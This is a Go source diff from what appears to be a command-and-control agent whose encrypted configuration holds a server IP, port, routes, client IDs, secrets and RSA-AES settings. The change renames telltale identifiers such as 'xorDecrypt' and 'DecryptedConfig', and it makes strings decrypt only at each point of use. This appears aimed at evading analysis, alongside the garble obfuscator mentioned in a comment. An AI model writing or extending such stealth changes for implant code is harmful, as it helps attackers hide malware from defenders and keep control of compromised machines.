@@ -10,9 +10,9 @@ import (
 	"strings"
 )
 
-// DecryptedConfig holds all decrypted configuration values
+// ResolvedConfig holds all decrypted configuration values
 // Using a struct instead of map[string]string because garble obfuscates struct field names
-type DecryptedConfig struct {
+type ResolvedConfig struct {
 	UserAgent              string
 	ContentType            string
 	CustomHeaders          string
@@ -52,51 +52,15 @@ var (
 )
 
 func init() {
-	// Decrypt HTTP protocol strings at startup
-	geMethodGet, _ = xorDecrypt(geMethodGet, xorKey)
-	geMethodPost, _ = xorDecrypt(geMethodPost, xorKey)
-	geProtoHttps, _ = xorDecrypt(geProtoHttps, xorKey)
-	geProtoHttp, _ = xorDecrypt(geProtoHttp, xorKey)
-	gePort443, _ = xorDecrypt(gePort443, xorKey)
-	gePort80, _ = xorDecrypt(gePort80, xorKey)
-	geFmtUrlNoPort, _ = xorDecrypt(geFmtUrlNoPort, xorKey)
-	geFmtUrlWithPort, _ = xorDecrypt(geFmtUrlWithPort, xorKey)
-	geFmtUrlQuery, _ = xorDecrypt(geFmtUrlQuery, xorKey)
-	geSlash, _ = xorDecrypt(geSlash, xorKey)
-
-	// Decrypt HTTP header name strings at startup
-	httpHeaderUserAgent, _ = xorDecrypt(httpHeaderUserAgent, xorKey)
-	httpHeaderContentType, _ = xorDecrypt(httpHeaderContentType, xorKey)
-	httpHeaderPadPre, _ = xorDecrypt(httpHeaderPadPre, xorKey)
-	httpHeaderPadApp, _ = xorDecrypt(httpHeaderPadApp, xorKey)
-	httpMetaId, _ = xorDecrypt(httpMetaId, xorKey)
-	httpMetaEncryption, _ = xorDecrypt(httpMetaEncryption, xorKey)
-	httpEncRsaAes, _ = xorDecrypt(httpEncRsaAes, xorKey)
-
-	// Decrypt JSON field names at startup
-	jfCT, _ = xorDecrypt(jfCT, xorKey)
-	jfCO, _ = xorDecrypt(jfCO, xorKey)
-	jfCI, _ = xorDecrypt(jfCI, xorKey)
-	jfCB, _ = xorDecrypt(jfCB, xorKey)
-	jfAI, _ = xorDecrypt(jfAI, xorKey)
-	jfFN, _ = xorDecrypt(jfFN, xorKey)
-	jfOF, _ = xorDecrypt(jfOF, xorKey)
-	jfRP, _ = xorDecrypt(jfRP, xorKey)
-	jfCC, _ = xorDecrypt(jfCC, xorKey)
-	jfTC, _ = xorDecrypt(jfTC, xorKey)
-	jfDA, _ = xorDecrypt(jfDA, xorKey)
-	jfAR, _ = xorDecrypt(jfAR, xorKey)
-	jfTS, _ = xorDecrypt(jfTS, xorKey)
-	jfJI, _ = xorDecrypt(jfJI, xorKey)
-	jfOU, _ = xorDecrypt(jfOU, xorKey)
-	jfEC, _ = xorDecrypt(jfEC, xorKey)
-	jfER, _ = xorDecrypt(jfER, xorKey)
-
-	// Initialize JSON fields (sets fallbacks for any empty fields)
 	initJSONFields()
 }
 
-func xorDecrypt(encoded, key string) (string, error) {
+func secVal(enc string) string {
+	v, _ := cfgDec(enc, cfgKey)
+	return v
+}
+
+func cfgDec(encoded, key string) (string, error) {
 	decoded, err := base64.StdEncoding.DecodeString(encoded)
 	if err != nil {
 		return "", fmt.Errorf(ErrCtx(E18, err.Error()))
@@ -110,38 +74,38 @@ func xorDecrypt(encoded, key string) (string, error) {
 	return string(result), nil
 }
 
-func decryptAllValues() *DecryptedConfig {
-	cfg := &DecryptedConfig{}
+func decryptAllValues() *ResolvedConfig {
+	cfg := &ResolvedConfig{}
 
-	cfg.UserAgent, _ = xorDecrypt(userAgent, xorKey)
-	cfg.ContentType, _ = xorDecrypt(contentType, xorKey)
-	cfg.CustomHeaders, _ = xorDecrypt(customHeaders, xorKey)
-	cfg.GetRoute, _ = xorDecrypt(getRoute, xorKey)
-	cfg.PostRoute, _ = xorDecrypt(postRoute, xorKey)
-	cfg.GetMethod, _ = xorDecrypt(getMethod, xorKey)
-	cfg.PostMethod, _ = xorDecrypt(postMethod, xorKey)
-	cfg.GetClientIDName, _ = xorDecrypt(getClientIDName, xorKey)
-	cfg.GetClientIDFormat, _ = xorDecrypt(getClientIDFormat, xorKey)
-	cfg.PostClientIDName, _ = xorDecrypt(postClientIDName, xorKey)
-	cfg.PostClientIDFormat, _ = xorDecrypt(postClientIDFormat, xorKey)
-	cfg.PostSecretName, _ = xorDecrypt(postSecretName, xorKey)
-	cfg.PostSecretFormat, _ = xorDecrypt(postSecretFormat, xorKey)
-	cfg.PublicKey, _ = xorDecrypt(publicKey, xorKey)
-	cfg.Secret, _ = xorDecrypt(secret, xorKey)
-	cfg.Protocol, _ = xorDecrypt(protocol, xorKey)
-	cfg.IP, _ = xorDecrypt(ip, xorKey)
-	cfg.Port, _ = xorDecrypt(port, xorKey)
-	cfg.GetClientIDTransforms, _ = xorDecrypt(getClientIDTransforms, xorKey)
-	cfg.PostClientIDTransforms, _ = xorDecrypt(postClientIDTransforms, xorKey)
-	cfg.PostDataTransforms, _ = xorDecrypt(postDataTransforms, xorKey)
-	cfg.ResponseDataTransforms, _ = xorDecrypt(responseDataTransforms, xorKey)
+	cfg.UserAgent, _ = cfgDec(userAgent, cfgKey)
+	cfg.ContentType, _ = cfgDec(contentType, cfgKey)
+	cfg.CustomHeaders, _ = cfgDec(customHeaders, cfgKey)
+	cfg.GetRoute, _ = cfgDec(getRoute, cfgKey)
+	cfg.PostRoute, _ = cfgDec(postRoute, cfgKey)
+	cfg.GetMethod, _ = cfgDec(getMethod, cfgKey)
+	cfg.PostMethod, _ = cfgDec(postMethod, cfgKey)
+	cfg.GetClientIDName, _ = cfgDec(getClientIDName, cfgKey)
+	cfg.GetClientIDFormat, _ = cfgDec(getClientIDFormat, cfgKey)
+	cfg.PostClientIDName, _ = cfgDec(postClientIDName, cfgKey)
+	cfg.PostClientIDFormat, _ = cfgDec(postClientIDFormat, cfgKey)
+	cfg.PostSecretName, _ = cfgDec(postSecretName, cfgKey)
+	cfg.PostSecretFormat, _ = cfgDec(postSecretFormat, cfgKey)
+	cfg.PublicKey, _ = cfgDec(publicKey, cfgKey)
+	cfg.Secret, _ = cfgDec(secret, cfgKey)
+	cfg.Protocol, _ = cfgDec(protocol, cfgKey)
+	cfg.IP, _ = cfgDec(ip, cfgKey)
+	cfg.Port, _ = cfgDec(port, cfgKey)
+	cfg.GetClientIDTransforms, _ = cfgDec(getClientIDTransforms, cfgKey)
+	cfg.PostClientIDTransforms, _ = cfgDec(postClientIDTransforms, cfgKey)
+	cfg.PostDataTransforms, _ = cfgDec(postDataTransforms, cfgKey)
+	cfg.ResponseDataTransforms, _ = cfgDec(responseDataTransforms, cfgKey)
 
 	// Set defaults for HTTP methods if they're empty
 	if cfg.GetMethod == "" {
-		cfg.GetMethod = geMethodGet
+		cfg.GetMethod = secVal(geMethodGet)
 	}
 	if cfg.PostMethod == "" {
-		cfg.PostMethod = geMethodPost
+		cfg.PostMethod = secVal(geMethodPost)
 	}
 
 	return cfg
@@ -152,27 +116,29 @@ func buildBaseURL(proto, ipAddr, portNum string) string {
 	proto = strings.ToLower(proto)
 
 	// Check if we should omit the port for standard HTTP/HTTPS ports
-	if (proto == geProtoHttps && portNum == gePort443) || (proto == geProtoHttp && portNum == gePort80) {
-		return fmt.Sprintf(geFmtUrlNoPort, proto, ipAddr)
+	if (proto == secVal(geProtoHttps) && portNum == secVal(gePort443)) || (proto == secVal(geProtoHttp) && portNum == secVal(gePort80)) {
+		return fmt.Sprintf(secVal(geFmtUrlNoPort), proto, ipAddr)
 	}
 
-	return fmt.Sprintf(geFmtUrlWithPort, proto, ipAddr, portNum)
+	return fmt.Sprintf(secVal(geFmtUrlWithPort), proto, ipAddr, portNum)
 }
 
 // buildGetURL constructs the complete GET URL
 func buildGetURL(baseURL, getRouteVal, clientIDName string, clientIDVal string) string {
-	if !strings.HasPrefix(getRouteVal, geSlash) {
-		getRouteVal = geSlash + getRouteVal
+	s := secVal(geSlash)
+	if !strings.HasPrefix(getRouteVal, s) {
+		getRouteVal = s + getRouteVal
 	}
 
-	return fmt.Sprintf(geFmtUrlQuery, baseURL, getRouteVal, clientIDName, clientIDVal)
+	return fmt.Sprintf(secVal(geFmtUrlQuery), baseURL, getRouteVal, clientIDName, clientIDVal)
 }
 
 // buildPostURL constructs the complete POST URL
 func buildPostURL(baseURL, postRouteVal, clientIDName string, clientIDVal string) string {
-	if !strings.HasPrefix(postRouteVal, geSlash) {
-		postRouteVal = geSlash + postRouteVal
+	s := secVal(geSlash)
+	if !strings.HasPrefix(postRouteVal, s) {
+		postRouteVal = s + postRouteVal
 	}
 
-	return fmt.Sprintf(geFmtUrlQuery, baseURL, postRouteVal, clientIDName, clientIDVal)
+	return fmt.Sprintf(secVal(geFmtUrlQuery), baseURL, postRouteVal, clientIDName, clientIDVal)
 }
